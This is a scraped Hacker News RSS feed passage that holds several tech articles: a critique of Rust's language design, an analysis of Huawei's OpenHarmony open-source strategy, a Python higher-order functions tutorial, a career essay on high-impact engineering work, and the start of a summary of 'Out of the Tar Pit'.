<p>This one I find really weird. Mostly because it seems so unnecessary for a relatively new language like Rust that is able to learn from many older languages. I‚Äôm talking about how things in the Rust standard library tend to be named. There are the names that are way too short like <code>Vec</code>, <code>Eq</code>, <code>Ord</code>, <code>Arc</code> and so on. This feels like <a href="https://en.cppreference.com/w/c/string/byte/strstr">strstr</a> all over again. And then there are the names that are actual words, but way too generic to infer the actual meaning without looking at the source or documentation. An example of this is the <code>Debug</code> trait. Couldn‚Äôt this be named <code>DebugFormattable</code>, <code>DebugStringifyable</code> or something like that? Another one of these is <code>Into</code>. Take a look at <a href="https://doc.rust-lang.org/std/convert/trait.Into.html#examples">this example from the docs</a>, in particular this line:</p>
<div><div><pre><code><span>assert_eq!</span><span>(</span><span>bytes</span><span>,</span> <span>s</span><span>.into</span><span>());</span>
</code></pre></div></div>

<p>What? I can‚Äôt be the only one who finds the use of a preposition as a function name very confusing.</p>

<h4 id="no-variadic-templates">No Variadic Templates</h4>
<p>This is a major dealbreaker for me. I see the same problems in every programming language I‚Äôve used that supports some form of generics but no variadics: Java, Kotlin and now Rust. They end up duplicating code for functions taking <code>0</code>, <code>1</code>, ‚Ä¶ , <code>k-1</code>, <code>k</code> arguments for some hardcoded <code>k</code>. It means you cannot write a generic <code>printf</code> without wrapping the arguments in an untyped array like Java‚Äôs <code>Object[]</code> or using macros to emulate them like Rust does. And these are just the most basic use cases, you can do much more interesting things with variadic generic types.
Having variadic templates means that you don‚Äôt need duplication, you can support any number of parameters and there is no overhead. They are an essential building block for truly generic abstractions.</p>

<h4 id="no-value-template-parameters">No Value Template Parameters</h4>
<p>While we‚Äôre on the topic of generics, Rust does not let me pass compile-time constants as generic parameters. This means I cannot have a statically-sized vector or matrix class that is generic over the number of elements. You might be able to do it by requiring the user to pass an array type, but that is not pretty and means they could pass an invalid type. It is my understanding though that this issue is being worked on, so I have hope that this will be supported in the not too distant future.</p>

<h4 id="no-template-specializations-and-partial-template-specializations">No Template Specializations and Partial Template Specializations</h4>
<p>To be honest, I feel like this is not as much of an immediate blocker as something that I know I‚Äôm going to need for some very specific thing at some point in the future. I know because I use it in C++ too, although very infrequently.
Partial specializations open the door to type functions, like <code>std::remove_pointer</code> in C++. That template is simply specialized on <code>T*</code> and returns <code>T</code> in that case.</p>

<h4 id="error-handling-is-a-mess">Error Handling is a Mess</h4>
<p>I‚Äôve saved this one for last and it‚Äôs going to be controversial so buckle up. If I could choose just one thing to be changed about Rust then forget about everything else because it would be this one.
The way ‚Äúidiomatic‚Äù error handling is currently done in Rust is just untenable to me, it infects everything. Every return is wrapped in an <code>Ok()</code> or <code>Err()</code> which just adds unnecessary noise, every return type must be wrapped in <code>Result&lt;&gt;</code>. It‚Äôs awful.
When I‚Äôm coding I usually start out by writing functions that cannot fail and then add error conditions in as I discover them. But what this means is that every single function in the entire call chain needs to have its return type updated and all return statements wrapped in <code>Ok()</code>. This is so tedious, I genuinely cannot comprehend how it does not come up more often. Am I doing something wrong here or has simply nobody dared to question the design?
Regardless, let me make a suggestion to improve the situation: Introduce syntax that separates the error from the return value, for example:</p>
<div><div><pre><code><span>fn</span> <span>can_fail</span><span>()</span> <span>-&gt;</span> <span>f32</span> <span>|</span> <span>MyError</span>
</code></pre></div></div>
<p>This would be equivalent to <code>Result&lt;f32, MyError&gt;</code>. The compiler can then translate every <code>return val;</code> to <code>return Ok(val);</code> if the function declares an error. For the failure return case we‚Äôre also going to need new syntax that desugars to <code>return Err(val);</code>, I suggest <code>fail val;</code>.
The result is that the code is semantically equivalent to the manual version, but returns are now always the same, regardless of whether the function can fail or not. All the noise is gone. You would still need to manually propagate errors, but I consider this a good thing‚Äîit is a hidden code path after all.</p>

<h2 id="conclusion">Conclusion</h2>
<p>I wrote this post because I‚Äôve been noticing an uptick in the amount of positive coverage Rust has been getting lately and I felt that my view was underrepresented. By no means am I saying that Rust is a bad language, just that it leaves a lot to be desired. In the end, it is all about trade-offs: Is the gain in memory safety worth the loss of flexibility? Presently I can answer this question for myself and my hobbyist projects with no. But Rust is clearly the future and I will hopefully be able to switch one day.</p>

  </div></div>]]>
            </description>
            <link>https://mgrech.dev/whats-stopping-me-from-using-rust/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24582337</guid>
            <pubDate>Thu, 24 Sep 2020 19:08:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[300 Years: Huawei's Open Source Strategy]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24582314">thread link</a>) | @ceohockey60
<br/>
September 24, 2020 | https://interconnected.blog/300-years-huawei-open-source-strategy/ | <a href="https://web.archive.org/web/*/https://interconnected.blog/300-years-huawei-open-source-strategy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="english-version">
                        <p>Lost in the fog of TikTok was an important announcement: Huawei open sourced its homemade mobile operating system, HarmonyOS, now dubbed OpenHarmony. This announcement flew under the radar, but has far-reaching implications to not just the future of mobile technology, but also how that landscape will influence the geopolitical chess match between the U.S. and China.</p><p>But like many things that come out of China, it‚Äôs less a game of chess, but more a game of <a href="https://en.wikipedia.org/wiki/Go_(game)">Go</a>. </p><figure><img src="https://interconnected.blog/content/images/2020/09/huawei-oss-strategy_small-2.jpg" alt="" srcset="https://interconnected.blog/content/images/size/w600/2020/09/huawei-oss-strategy_small-2.jpg 600w, https://interconnected.blog/content/images/size/w1000/2020/09/huawei-oss-strategy_small-2.jpg 1000w, https://interconnected.blog/content/images/2020/09/huawei-oss-strategy_small-2.jpg 1568w" sizes="(min-width: 720px) 720px"></figure><h2 id="openharmony-the-technology">OpenHarmony: the Technology</h2><p>Let‚Äôs first get a handle on the technology that underpins OpenHarmony. Because the project started, first in 2012 and intensified in 2019, as a strategic initiative to reduce Huawei‚Äôs reliance on the Android operating system due to U.S. sanctions, many <a href="https://www.forbes.com/sites/davidphelan/2020/08/28/what-is-huaweis-smartphone-operating-system--should-i-buy-into-it/#4ca0a8311fd7">mistakenly believe</a> it is based on either Android or Linux (of which Android is based). <strong>That‚Äôs not true.</strong></p><p>OpenHarmony is based on another open source operating system called <a href="https://en.wikipedia.org/wiki/FreeBSD">FreeBSD</a>. Interestingly, Apple‚Äôs macOS and iOS also leveraged FreeBSD indirectly from another operating system project called Darwin. So, on a bits and bytes level, Huawei‚Äôs OpenHarmony is more similar to iOS than Android.</p><p>This is a smart decision because if the whole point is to reduce reliance on Android, the most important thing to avoid is co-mingling code with either Android or Linux in case it triggers obscure licensing restrictions. And the last thing a development team wants is to have technology licensing lawyers checking every line of code the engineers write, especially when they need to develop quickly to avoid an existential crisis, which is what Huawei has right now.</p><p>Because the project is open sourced, there‚Äôs a lot one can do now to evaluate and verify OpenHarmony. In fact, I verified the <a href="https://openharmony.gitee.com/openharmony/kernel_liteos_a/blob/master/bsd/arm/autoconf.c">FreeBSD lineage by rummaging through</a> its codebase, which is all hosted on Gitee. For readers who had a chance to read my previous post ‚Äú<a href="https://interconnected.blog/can-you-nationalize-open-source/"><strong>Can You ‚ÄòNationalize‚Äô Open Source?</strong></a>‚Äù, Gitee should sound familiar. It is a Git-based developer collaboration application that was recently anointed by the Ministry of Industry and Information Technology (MIIT) as the domestic ‚Äúnational champion‚Äù to drive open source growth in China. <strong>What I didn‚Äôt know when I wrote the previous post was that Huawei also became a strategic investor in Gitee in early September via </strong><a href="https://media.qimingpian.cn/qmp/b131b66d760b6b900485a1e30c2762f5.html"><strong>its corporate venture arm, Habo</strong></a><strong>.</strong></p><p>But as every open source technologist can attest, no project ever gets traction without a long period of steadfast community-building and credibility-building. That‚Äôs where the OpenAtom Foundation comes in.</p><h2 id="openatom-the-foundation">OpenAtom: the Foundation</h2><p>The OpenAtom Foundation is China‚Äôs first non-profit organization of its kind geared towards fostering open source technologies, much in the same way as the Linux Foundation or the Apache Software Foundation. <strong>Huawei drove the founding of this foundation, and OpenHarmony is its anchor project.</strong></p><p>But what is the point of a foundation anyway? As I‚Äôve written in ‚Äú<a href="https://interconnected.blog/covid-open-source-industrial-policy/"><strong>COVID, Open Source, Industrial Policy</strong></a>‚Äù, a foundation‚Äôs involvement can help open source technologies in two meaningful ways: <strong>accelerate development and vendor neutrality.</strong> In a nutshell, vendor neutrality is important because it allows other large companies to contribute in the development of an open source technology without fearing vendor lock-in by another company, thus leads to faster development of that technology. An example would be Kuberentes, an open source container orchestration software that was first created by Google but is now the anchor project for the <a href="https://www.cncf.io/">Cloud Native Computing Foundation</a> (CNCF); Kubernetes‚Äôs <a href="https://www.zdnet.com/article/kubernetes-and-containers-are-growing-up-fast-survey-shows/">fast growth</a> would not be possible if it still resides within Google.</p><p>While a foundation‚Äôs involvement is by no means necessary -- and many open source projects have become popular without a foundation‚Äôs support -- it does help. <strong>And that‚Äôs what the OpenAtom Foundation is trying to deliver for China‚Äôs technology ecosystem. </strong>Its model and value proposition is similar to that of the Linux Foundation: basically <strong>delivering foundation (thus neutrality) as a service</strong> to open source projects, including legal, IP trademark management, licensing, community building, joint marketing, etc.</p><p>An open source foundation is successful when it builds an ecosystem of technologies around the anchor project with a coherent theme. The Linux Foundation, of course, built an ecosystem around Linux with many ancillary and adjacent technologies around the ‚Äúopen source operating system‚Äù theme. &nbsp;The CNCF (a subsidiary foundation of the Linux Foundation) <a href="https://github.com/cncf/landscape/blob/master/README.md#trail-map">built an ecosystem</a> of technologies around Kubernetes and the ‚Äúcloud-native‚Äù theme.</p><p>While the OpenAtom Foundation is <a href="https://www.openatom.org/#/projectList">already hosting seven projects</a> as part of its launch, with a lofty goal of fostering open source software, hardware, semiconductors, and content (I‚Äôm assuming documentation and technical education), the only theme seems to be that all projects were created by Chinese companies. And besides OpenHarmony, whose strategic value to Huawei is clear, the other technologies seem trivial to their original creators:</p><ul><li><strong>Xuperchain</strong>, a blockchain infrastructure project from <strong>Baidu</strong></li><li><strong>TKEStack</strong> (a container orchestration layer based on Kubernetes) and <strong>TencentOS</strong> (an energy-efficient IoT operating system) from <strong>Tencent</strong></li><li><strong>AliOS</strong> (a light-weight IoT operating system) from <strong>Alibaba</strong></li><li><strong>PIKA</strong> (a storage system based on the open source database, Redis) from <strong>Qihoo360</strong></li><li><strong>UBML</strong> (a Unified Business Modeling Language modeling system) from <strong>Netease</strong><br></li></ul><figure><img src="https://lh4.googleusercontent.com/73XjJgCZnhJYxnCW4L8XjLFa9FHQbxAz7nYWTWmaGAsUVSW-L7TH7BurSGCj-H1sc2PnemuL2tuzm16EM7vxtBs8ydPAhQSHCHnsMidVpguJhBaU6hVavLasls45i76RPVNyGFbZ" alt=""></figure><p>If I have to surmise a future theme that is technology-focused and not nationality-focused, it would be IoT because when OpenHarmony was first unveiled in 2019 (as HarmonyOS), it was an IoT-focused operating system, like TencentOS and AliOS. But since then, its scope has broadened to include support for smartphones, watches, and smart TVs.</p><p>One other curious element about OpenAtom is that <strong>only two projects</strong> (OpenHarmony, TencentOS) are hosted on the ‚Äúnational champion‚Äù, <strong>Gitee</strong>, while <strong>four others</strong> (AliOS, PIKA, Xuperchain, TKE) are on <strong>GitHub</strong>. The remaining one, UBML from Netease, requires a developer to fill out a form to apply for access, which is a very developer-<em><strong>un</strong></em>friendly way to run an open source project.</p><h2 id="technology-foundation-developer-approval">Technology + Foundation = Developer Approval?</h2><p>That‚Äôs the hope anyway. The nirvana of an open source technology, with or without a foundation, is to achieve widespread participation and buy-in among developers, who will both make use of the technology at scale and contribute to its development. And if an <em>experienced</em> foundation gets involved to leverage its best practices in open source management, it can increase the success rate by reducing much of the messiness and common mistakes that often plague young open source projects.</p><p>In the case of Huawei though, <strong>OpenHarmony is a young project, and OpenAtom is an even younger foundation.</strong></p><p>The lazy and obvious conclusion here is to just dismiss all these efforts as a fool‚Äôs errand. <strong>But that‚Äôs not what you came to Interconnected for. </strong>The honest and nuanced conclusion is: <strong>it‚Äôs too early to tell and there are trends working both against and for Huawei‚Äôs open source strategy.</strong></p><h3 id="factors-against">Factors Against</h3><p>Huawei is infamous for its secretive ownership structure. Nobody knows exactly who or what owns Huawei. It‚Äôs a private Chinese LLC. It‚Äôs employee-owned, with 98.99% of company shares controlled by its employees via a ‚Äútrade union committee‚Äù. Allegedly, this committee pays dues to more senior trade unions in an opaque bureaucracy that ultimately leads to the All-China Federation of Trade Unions, which is controlled by the Chinese Communist Party (thus all the controversy). That‚Äôs why <a href="https://interconnected.blog/why-huawei-should-ipo-in-america/">I‚Äôve advocated for Huawei to IPO in New York</a> -- a bold act that would bring some desperately-needed credibility to the company.</p><p>Along the same vein, the OpenAtom Foundation also needs transparent, credible governance of its projects <em>and itself</em>. It currently boasts a 16-member Technical Oversight Committee (TOC), a typical governing element of an open source foundation, with Chinese technologists who have had years of experience working on projects in the Apache Software Foundation and Mozilla Foundation -- a good start. Their decision making process will have to be public and transparent to earn credibility from the wide developer community, both within and outside of China. As a reference, the <a href="https://github.com/cncf/toc/">CNCF TOC‚Äôs every governing deliberation</a> is viewable and commentable on GitHub. Because OpenAtom is, after all, a China-registered entity, to what degree it can deliver pure transparency is questionable.</p><p>Lastly, OpenHarmony‚Äôs birthright as a Chinese creation makes building neutrality and credibility harder than just about any other birthright on the planet. <strong>This is an obvious yet important point that every Chinese company is struggling with right now. It is an element that every Chinese immigrant living abroad has been struggling with for much longer. </strong>For a young project, OpenHarmony does have reasonably good documentation in both English and Chinese -- an important first step that must be continued for the long haul. Maintaining a bilingual presence (much like this blog) requires lots of extra hard work -- work that an American-born, German-born, or French-born project does not have to do. <strong>None of us can pick where we are born, but we all have to deal with its uneven consequences. There is no point in pretending that doesn‚Äôt exist.</strong></p><h3 id="factors-for">Factors For</h3><p>It‚Äôs not all doom and gloom for Huawei; there are a couple of factors potentially working in its favor. For one, the U.S.‚Äôs own credibility and neutrality when regulating cross-border technology businesses is also deteriorating. The Trump administration‚Äôs wheeling and dealing of TikTok is nothing short of cronyism, so much so that it has been called out by <a href="https://www.wsj.com/articles/trump-tiktok-and-crony-capitalism-11600639766?mod=hp_opin_pos_2">none other than the WSJ editorial board</a>. Although this doesn‚Äôt mean Huawei will have an opening to re-enter the U.S. market, other parts of the world may be more receptive to its technology. Regions like Southeast Asia, Latin America, the Middle East, and Africa are all credible possibilities. (See more in ‚Äú<a href="https://interconnected.blog/where-can-the-chinese-internet-go/"><strong>Where Can the Chinese ‚Ä¶</strong></a></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://interconnected.blog/300-years-huawei-open-source-strategy/">https://interconnected.blog/300-years-huawei-open-source-strategy/</a></em></p>]]>
            </description>
            <link>https://interconnected.blog/300-years-huawei-open-source-strategy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24582314</guid>
            <pubDate>Thu, 24 Sep 2020 19:06:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Systems Software Research is Irrelevant (2000) [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24582279">thread link</a>) | @ra7
<br/>
September 24, 2020 | http://herpolhode.com/rob/utah2000.pdf | <a href="https://web.archive.org/web/*/http://herpolhode.com/rob/utah2000.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://herpolhode.com/rob/utah2000.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-24582279</guid>
            <pubDate>Thu, 24 Sep 2020 19:03:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Higher Order Functions in Python]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24582199">thread link</a>) | @renanmoura
<br/>
September 24, 2020 | https://renanmf.com/higher-order-functions-in-python/ | <a href="https://web.archive.org/web/*/https://renanmf.com/higher-order-functions-in-python/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Also known as first-class functions, functions can take other functions as parameters and also return other functions.</p>
<p>Since everything in Python is an object, we can treat functions as such.</p>
<p>Say you have a list of car brands that is totally messy and you want to normalize them.</p>
<p>The task is for all of them to be lower case, no extra spaces at the beginning or end of each brand name.</p>
<p>One way to do that is to use the special functions built-in Python to handle strings.</p>
<p><code>strip()</code> will remove the extra spaces, <code>lower()</code> will convert all the characters into lower case</p>
<p>We are going to define a function that takes a list, iterates over the values, and applies the cleaning to each of them.</p>
<p>Then we take each new normalized value and add it to a new list <code>normalized_brands</code> that will be returned as a result of our function execution.</p>
<pre><code>car_brands = ['BMW ', 'Ferrari', 'McLareN', ' TOyota', '   Ford   ']

def normalize_brands(brand_list):
     normalized_brands = []
     for brand in brand_list:
             brand = brand.strip()
             brand = brand.lower()
             normalized_brands.append(brand)
     return normalized_brands

car_brands_normalized = normalize_brands(car_brands)

print(car_brands_normalized)</code></pre>
<pre><code>['bmw', 'ferrari', 'mclaren', 'toyota', 'ford']</code></pre>
<p>It works as expected, but this function is very useful and could be refactored to be more generalist.</p>
<p>Functions can also be treated as objects, meaning we can have things like a list of functions!</p>
<p>Then we can iterate over them and apply the values in a more dynamic fashion, let‚Äôs see that in action to make it more clear.</p>
<pre><code>car_brands = ['BMW ', 'Ferrari', 'McLareN', ' TOyota', '   Ford   ']

normalization_functions = [str.strip, str.lower]

def normalize_strings(string_list, functions):
     normalized_strings = []
     for item in string_list:
             for func in functions:
                     item = func(item)
             normalized_strings.append(item)
     return normalized_strings

normalized_brands = normalize_strings(car_brands, normalization_functions)

print(normalized_brands)</code></pre>
<pre><code>['bmw', 'ferrari', 'mclaren', 'toyota', 'ford']</code></pre>
<p>We have a list of strings as before, but now we also have a list of functions.</p>
<p>Our function <code>normalize_strings</code> now expects both lists, the strings, and the functions list.</p>
<p>We create a new empty list to store our normalized strings.</p>
<p>Then the first <code>for</code> loop goes through each item in <code>string_list</code> and the second <code>for</code> loop goes through each item in <code>functions</code>.</p>
<p>Then we apply each <code>func</code> to each <code>item</code> by calling <code>item = func(item)</code>.</p>
<p>Then we add the new normalized item to our new list and when it finishes, we return <code>normalized_strings</code>.</p>
<p>This way we can increase <code>normalization_functions</code> to have as many functions as we need and reuse <code>normalize_strings(string_list, functions)</code> in many other situations.</p>
</div></div>]]>
            </description>
            <link>https://renanmf.com/higher-order-functions-in-python/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24582199</guid>
            <pubDate>Thu, 24 Sep 2020 18:56:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Self Promotion: How to Sell Yourself]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24582151">thread link</a>) | @IncRnd
<br/>
September 24, 2020 | https://www.coachingforchange.com/pub06.html | <a href="https://web.archive.org/web/*/https://www.coachingforchange.com/pub06.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.coachingforchange.com/pub06.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24582151</guid>
            <pubDate>Thu, 24 Sep 2020 18:52:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Work on What Matters]]>
            </title>
            <description>
<![CDATA[
Score 470 | Comments 121 (<a href="https://news.ycombinator.com/item?id=24581810">thread link</a>) | @wholien
<br/>
September 24, 2020 | https://staffeng.com/guides/work-on-what-matters | <a href="https://web.archive.org/web/*/https://staffeng.com/guides/work-on-what-matters">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><h4><a href="https://staffeng.com/guides">Guides</a> / <a href="https://staffeng.com/guides/work-on-what-matters">Work on what matters</a></h4><div><p>We all have a finite amount of time to live, and within that mortal countdown we devote some fraction towards our work. Even for the most career-focused, your life will be filled by many things beyond work: supporting your family, children, exercise, being a mentor and a mentee, hobbies, and so the list goes on. This is the sign of a rich life, but one side-effect is that time to do your work will become increasingly scarce as you get deeper into your career.</p>
<p>If you‚Äôre continuing to advance in your career, then even as your time available for work shrinks, the expectations around your impact will keep growing. For a while you can try sleeping less or depriving yourself of the non-work activities you need to feel whole, but you‚Äôll inevitably find that your work maintains an aloof indifference to your sacrifice rather than rewarding it. Only through <a href="https://lethain.com/forty-year-career/">pacing your career to your life</a> can you sustain yourself for the long-term.</p>
<p>Indeed, pacing yourself becomes the central challenge of a sustained, successful career: increasingly senior roles require that you accomplish more and more, and do it in less and less time. The ledge between these two constraints gets narrower the further you go, but it remains walkable if you take a deliberate approach.</p>
<p>First a discussion on a few common ways to get tripped up: <em>snacking</em>, <em>preening</em>, and <em>chasing ghosts</em>. Then we‚Äôll get into the good stuff: how <em>do</em> you work on what really matters?</p>
<h2>Avoid snacking</h2>
<p>Hunter Walk recommends that folks <a href="https://hunterwalk.com/2016/06/18/the-best-startups-resists-snacks-im-not-talking-about-food/">avoid ‚Äúsnacking‚Äù</a> when they prioritize work. If you‚Äôre in a well-run organization, at some point you‚Äôre going to run out of things that are both high-impact and easy. This leaves you with a choice between shifting right to hard and high-impact or shifting down to easy and low-impact. The latter choice--easy and low-impact--is what Walk refers to as <em>snacking</em>.</p>
<p>When you‚Äôre busy, these snacks give a sense of accomplishment that makes them psychologically rewarding but you‚Äôre unlikely to learn much from doing them, others are likely equally capable of completing them (<em>and</em> for some of them it might be a good development opportunity), and there‚Äôs a tremendous opportunity cost versus doing something higher impact.</p>
<p>It‚Äôs ok to spend some of your time on snacks to keep yourself motivated between bigger accomplishments, but you have to keep yourself honest about how much time you‚Äôre spending on high-impact work versus low-impact work. In senior roles, you‚Äôre more likely to self-determine your work and if you‚Äôre not deliberately tracking your work, it‚Äôs easy to catch yourself doing little to no high-impact work.</p>
<h2>Stop preening</h2>
<p>Where ‚Äúsnacking‚Äù is the broad category of doing easy and low-impact work, there‚Äôs a particularly seductive subset of snacking that I call ‚Äúpreening.‚Äù Preening is doing low-impact, high-visibility work. Many companies conflate high-visibility and high-impact so strongly that they can‚Äôt distinguish between preening and impact, which is why it‚Äôs not uncommon to see some companies‚Äô senior-most engineers spend the majority of their time doing work of dubious value but that is frequently recognized in company meetings.</p>
<p>If you‚Äôre taking a short-term look at <a href="https://yenkel.dev/posts/how-to-achieve-career-growth-opportunities-skills-sponsors">career growth</a>, then optimizing for your current organization‚Äôs pathologies in evaluating impact is the optimal path: go forth and preen gloriously. However, if you‚Äôre thinking about developing yourself to succeed as your <a href="https://lethain.com/growing-with-your-company/">current role grows in complexity</a> or across multiple organizations, then it‚Äôs far more important to strike a balance between valued work and self-growth.</p>
<p>This is also an important factor to consider when choosing a company to work at! Dig into what a company values and ensure it aligns with your intended personal growth. If a company‚Äôs leadership is entirely folks who focus their energy on performant urgency or acts of fealty, don‚Äôt be surprised when your success in the company depends on those activities.</p>
<p>Worse, to be a successful preener requires a near invulnerability to criticism of your actual impact, and your true work <em>will</em> suffer if your energy is diverted to preening. Typically this means you need to be a vanity hire of a senior leader or to present yourself in the way a company believes leaders look and act. If that isn‚Äôt you, then your attempt to exchange your good judgement for company success will end up failing anyway: you‚Äôll get held accountable for the lack of true impact where others who match the company‚Äôs expectation of how a leader appears will somehow slip upward.</p>
<h2>Stop chasing ghosts</h2>
<p>Many folks would assume that companies, rational optimizers that they are, avoid spending much time on low-impact high-effort projects. Unfortunately that isn‚Äôt consistently the case. It‚Äôs surprisingly common for a new senior leader to join a company and immediately drive <a href="https://lethain.com/grand-migration/">a strategy shift that fundamentally misunderstands the challenges at hand</a>. The ghosts of their previous situation hold such a firm grasp on their understanding of the new company that they misjudge the familiar as the essential.</p>
<p>As a senior leader, you have to maintain a hold on your ego to avoid investing into meaningless work at a grand scale. This can be surprisingly challenging when during your hiring process you‚Äôve been repeatedly told that you‚Äôve been hired to fix something deeply broken -- you‚Äôre the newly-hired savior, of course your instincts are right! Taking the time to understand the status quo before shifting it will always repay diligence with results.</p>
<p>I had a recent discussion with someone who argued that new senior leaders <em>deliberately</em> push for major changes even though they suspect the efforts will fail. Such changes make the organization increasingly dependent on the new leader, and also ensures anything that <em>does</em> go well gets attributed to the new leader directly rather than their team. If this is your approach to leadership, please know that you‚Äôre awful and take the time to work on yourself until the well-being and success of an entire company matters to you more than being perceived as essential.</p>
<h2>Existential issues</h2>
<p>Now that you‚Äôre done snacking, preening and chasing ghosts, the first place to look for work that matters is exploring whether your company is experiencing an existential risk. Companies operate in an eternal <a href="https://lethain.com/iterative-elimination-tournaments/">iterative elimination tournament</a>, balancing future success against surviving until that future becomes the present. If you‚Äôre about to lose one of those rounds, then always focus there.</p>
<p>Running out of money, <a href="https://lethain.com/digg-v4/">like my experience at Digg</a>, can be the most obvious issue, but not every existential issue is financial, like <a href="https://www.theatlantic.com/technology/archive/2015/01/the-story-behind-twitters-fail-whale/384313/">Twitter‚Äôs fail whale stability challenges</a> or adapting to the shifts caused by the Covid-19 pandemic.</p>
<p>If something dire is happening at your company, then that‚Äôs the place to be engaged. Nothing else will matter if it doesn‚Äôt get addressed.</p>
<h2>Work where there‚Äôs room <em>and</em> attention</h2>
<p>Existential issues are usually <em>not</em> the most efficient place to add your efforts, but efficiency isn‚Äôt a priority when the walls are crashing down around you. You <em>should</em> swarm to existential problems, but if a problem isn‚Äôt existential then you should be skeptical of adding your efforts where everyone‚Äôs already focused. Folks often chase leadership‚Äôs top priority, but with so many folks looking to make their impact there, it‚Äôs often challenging to have a meaningful impact.</p>
<p>Instead, the most effective places to work are those that matter to your company but still have enough room to actually do work. What are priorities that will become critical in the future, where you can do great work ahead of time? Where are areas that are doing <em>ok</em> but could be doing <em>great</em> with your support?</p>
<p>Sometimes you‚Äôll find work that‚Äôs <em>worthy</em> of attention, but which an organization is incapable of paying attention to, usually because its leadership doesn‚Äôt value that work. In some companies this is developer tooling work, in others it‚Äôs inclusion work, and in most companies it‚Äôs <a href="https://noidea.dog/glue">glue work</a>.</p>
<p>There is almost always a great deal of room to do this sort of work that no one is paying attention to, so you‚Äôll be able to make rapid initial progress on it, which <em>feels</em> like a good opportunity to invest. At some point, though, you‚Äôll find that the work needs support, and it‚Äôs quite challenging to get support for work that a company is built to ignore or devalue. Your early wins will slowly get eroded by indifference and misalignment, and your initial impact will be reclaimed by the sands of time.</p>
<p>Does this mean you shouldn‚Äôt do inclusion work? No, that‚Äôs not the conclusion I want you to take away from this. Sometimes an area that an organization doesn‚Äôt pay attention to is so important that you‚Äôre going to want to advocate for it to start paying attention. Teaching a company to value something it doesn‚Äôt care about is considerably the hardest sort of work you can do, and it often fails, so you should do as little of it as you can, but no less. As a senior leader, you have an ethical obligation that goes beyond maximizing your company-perceived impact, but it‚Äôs important to recognize what you‚Äôre up against and time your efforts accordingly.</p>
<h2>Foster growth</h2>
<p>One area that‚Äôs often underinvested in (e.g. lots of room to work in) while also being highly leveraged is growing the team around you. <em>Hiring</em> has a lot of folks involved in it, usually in terms of optimizing the <a href="https://lethain.com/hiring-funnel/">hiring funnel</a>, but onboarding, mentoring and coaching are wholly neglected at many companies despite being <em>at least</em> <a href="https://lethain.com/productivity-in-the-age-of-hypergrowth/">as impactful as hiring to your company‚Äôs engineering velocity</a>.</p>
<p>If you start dedicating even a couple hours a week to developing the team around you, it‚Äôs quite likely that will become your legacy long after your tech specs and pull requests are forgotten.</p>
<h2>Edit</h2>
<p>A surprising number of projects are one small change away from succeeding, one quick modification that unlocks a new opportunity, or one conversation away from consensus. I think of making those small changes, quick modifications and short conversations as <em>editing</em> your team‚Äôs ‚Ä¶</p></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://staffeng.com/guides/work-on-what-matters">https://staffeng.com/guides/work-on-what-matters</a></em></p>]]>
            </description>
            <link>https://staffeng.com/guides/work-on-what-matters</link>
            <guid isPermaLink="false">hacker-news-small-sites-24581810</guid>
            <pubDate>Thu, 24 Sep 2020 18:26:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hacker News for ML]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24581619">thread link</a>) | @DTE
<br/>
September 24, 2020 | https://mln.dev/top/1 | <a href="https://web.archive.org/web/*/https://mln.dev/top/1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://mln.dev/top/1</link>
            <guid isPermaLink="false">hacker-news-small-sites-24581619</guid>
            <pubDate>Thu, 24 Sep 2020 18:11:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Out of the Tar Pit: A Summary]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24581591">thread link</a>) | @todsacerdoti
<br/>
September 24, 2020 | http://kmdouglass.github.io/posts/summary-out-of-the-tar-pit/ | <a href="https://web.archive.org/web/*/http://kmdouglass.github.io/posts/summary-out-of-the-tar-pit/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody text">
    <div>
<p><a href="http://curtclifton.net/papers/MoseleyMarks06a.pdf">Out of the Tar Pit</a> is a 2006 paper by Ben Moseley and Peter Marks about the causes and effects
of complexity in software systems. The thesis of the paper is stated already in the second sentence
of the paper:</p>
<blockquote>
The biggest problem in the development and maintenance of large-scale software systems is
complexity ‚Äî large systems are hard to understand.</blockquote>
<p>As implied by the authors, complexity is a property of a software system that represents the degree
of difficulty that is experienced when trying to understand the system. State‚Äîin particular mutable
state‚Äîis the primary cause of complexity. Additional causes are code volume and control flow, but
these are of secondary importance.</p>
<div id="complexity">
<h2>Complexity</h2>
<p>Of the four properties described by Brooks in the paper entitled <a href="https://en.wikipedia.org/wiki/No_Silver_Bullet">No Silver Bullet</a> that make
building software hard (complexity, conformity, changeability, invisibility), the authors state
that complexity is the only meaningful one:</p>
<blockquote>
